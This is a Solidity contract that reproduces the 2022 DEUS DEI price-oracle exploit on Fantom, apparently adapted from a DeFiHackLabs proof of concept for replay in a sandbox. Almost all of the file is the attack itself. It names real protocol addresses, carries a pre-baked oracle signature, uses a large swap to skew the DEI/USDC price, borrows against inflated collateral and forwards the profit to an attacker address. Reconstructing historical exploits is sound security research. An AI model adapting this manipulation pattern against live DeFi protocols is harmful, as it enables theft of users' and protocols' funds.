// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-04-deus).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// `ContractTest` (test/deus_exp.sol) — the first action is a `vm.prank(owner_of_usdc)`
// privileged fUSDC `Swapin` mint, and everything else runs directly from the test.
// There is no standalone exploit contract to deploy, so for the playground we
// hand-author this faithful, self-contained copy of the inline attack. Logic,
// constants, magic numbers, and the baked Schnorr signature are copied verbatim
// from test/deus_exp.sol so the recording matches the on-chain behaviour.
//
// Reproduction model:
//   - The privileged `Swapin` mint is performed OUTSIDE this contract, by the
//     recorder, as a setup step with `caller = owner_of_usdc` (Foundry
//     `vm.prank(owner_of_usdc)` equivalent). It mints 150M USDC to THIS contract.
//   - This contract's recorded `run()` entrypoint then performs the remaining 8
//     steps verbatim: buyDei -> addLiquidity -> LpDepositor.deposit ->
//     addCollateral -> swap USDC->DEI -> borrow -> swap DEI->USDC -> repay 150M.
//   - At the very end it forwards the residual USDC (the extracted profit) to the
//     `owner_` it was constructed with, so the recorder can score it as the
//     attacker EOA's USDC delta (the PoC's "The USDC after paying back" figure).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IBaseV1Router01 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        bool stable,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function swapExactTokensForTokensSimple(
        uint256 amountIn,
        uint256 amountOutMin,
        address tokenFrom,
        address tokenTo,
        bool stable,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface ISSPv4 {
    function buyDei(uint256 amountIn) external;
}

interface ILpDepositor {
    function deposit(address pool, uint256 amount) external;
}

interface IDeiLenderSolidex {
    function addCollateral(address to, uint256 amount) external;

    function borrow(
        address to,
        uint256 amount,
        uint256 price,
        uint256 timestamp,
        bytes memory reqId,
        SchnorrSign[] memory sigs
    ) external returns (uint256 debt);
}

struct SchnorrSign {
    uint256 signature;
    address owner;
    address nonce;
}

contract DeusDrain {
    // --- Fantom / DEUS DEI constants (block 37,093,708) -----------------------
    address constant OWNER_OF_USDC = 0xC564EE9f21Ed8A2d8E7e76c085740d5e4c5FaFbE;
    address constant USDC = 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75; // fUSDC (6 dec)
    address constant DEI = 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3; // 18 dec
    address constant ISSPV4 = 0xbe9dE5747317F27f9A39ea5924ed4c51b34fB0d1; // DEI minter
    address constant ROUTER = 0xa38cd27185a464914D3046f0AB9d43356B34829D; // BaseV1 router
    address constant PAIR = 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0; // DEI/USDC pair (LP)
    address constant DEPOSIT_TOKEN = 0xD82001B651F7fb67Db99C679133F384244e20E79;
    address constant LP_DEPOSITOR = 0x26E1A0d851CF28E697870e1b7F053B605C8b060F;
    address constant DEI_LENDER = 0x8D643d954798392403eeA19dB8108f595bB8B730;

    IERC20 private constant usdc = IERC20(USDC);
    IERC20 private constant dei = IERC20(DEI);
    IERC20 private constant lpToken = IERC20(PAIR);
    IERC20 private constant depositToken = IERC20(DEPOSIT_TOKEN);
    IBaseV1Router01 private constant router = IBaseV1Router01(ROUTER);
    ISSPv4 private constant sspv4 = ISSPv4(ISSPV4);
    ILpDepositor private constant lpDepositor = ILpDepositor(LP_DEPOSITOR);
    IDeiLenderSolidex private constant deiLender = IDeiLenderSolidex(DEI_LENDER);

    address public immutable owner; // attacker EOA the residual USDC is forwarded to

    // Pre-baked Schnorr price-feed signature (copied verbatim from the PoC). The
    // Solidex MuSig oracle verifies this against ecrecover; the signing set was
    // producible for the attacker at the time.
    SchnorrSign internal sig = SchnorrSign({
        signature: 1_835_036_472_718_200_664_753_898_924_933_875_196_349_373_787_186_253_604_571_797_551_094_739_683_650,
        owner: 0xF096EC73cB49B024f1D93eFe893E38337E7a099a,
        nonce: 0xD58D8931b98942EE19C431B72f4Bc8B3eD28d8DF
    });

    bytes internal repID = "0x01701220183a8e97b39ebe3c38b6166cd7c9ddfe3c38fd76352e5652b9c25467aa47b040";

    constructor(address _owner) {
        owner = _owner;
    }

    // The recorded entrypoint. By the time this runs, the recorder has already
    // performed the privileged fUSDC `Swapin` mint (as owner_of_usdc) funding
    // this contract with 150M USDC.
    function run() public {
        // 1. buyDei: post 1M USDC, mint 1M DEI at the 80% collateral ratio.
        usdc.approve(ISSPV4, type(uint256).max);
        sspv4.buyDei(1_000_000 * 10 ** 6);

        // 2. addLiquidity: pair freshly-minted DEI + USDC into the DEI/USDC pair.
        usdc.approve(ROUTER, type(uint256).max);
        dei.approve(ROUTER, type(uint256).max);
        router.addLiquidity(
            DEI,
            USDC,
            true,
            894_048_109_294_000_000_000_000,
            965_495_000_000,
            876_167_147_108_120_000_000_000,
            946_185_100_000,
            address(this),
            block.timestamp
        );

        // 3. LpDepositor.deposit: wrap LP into a DepositToken receipt.
        uint256 balanceOfLpToken = lpToken.balanceOf(address(this));
        lpToken.approve(LP_DEPOSITOR, type(uint256).max);
        lpDepositor.deposit(PAIR, balanceOfLpToken);

        // 4. addCollateral: post the DepositToken receipt as borrow collateral.
        uint256 balanceOfDepositToken = depositToken.balanceOf(address(this));
        depositToken.approve(DEI_LENDER, type(uint256).max);
        deiLender.addCollateral(address(this), balanceOfDepositToken);

        // 5. Swap more USDC into DEI through the pair to inflate the DEI balance
        //    ahead of the borrow (also skews the on-chain DEI/USD oracle).
        usdc.approve(ROUTER, type(uint256).max);
        router.swapExactTokensForTokensSimple(
            143_200_000_000_000, 0, USDC, DEI, true, address(this), block.timestamp
        );

        // 6. borrow: mint borrowed DEI against the bogus-asset-backed collateral.
        //    The Schnorr oracle verifies the PRICE; it cannot verify the reality
        //    of the collateral behind that price.
        SchnorrSign[] memory sigs = new SchnorrSign[](1);
        sigs[0] = sig;
        deiLender.borrow(
            address(this),
            17_246_885_701_212_305_622_476_302,
            20_923_953_265_992_870_251_804_289,
            1_651_113_560,
            repID,
            sigs
        );

        // 7. Exit: swap borrowed + held DEI back into USDC through the pair.
        router.swapExactTokensForTokensSimple(
            12_000_000_000_000_000_000_000_000, 0, DEI, USDC, true, address(this), block.timestamp
        );

        // 8. Repay the full 150M USDC principal to the owner, laundering the cycle.
        usdc.transfer(OWNER_OF_USDC, 150_000_000 * 10 ** 6);

        // 9. Forward the residual (extracted profit) to the attacker so the recorder
        //    can score it as the attacker EOA's US delta (the PoC's "USDC after
        //    paying back" figure). Matches the PoC's net result.
        usdc.transfer(owner, usdc.balanceOf(address(this)));
    }
}
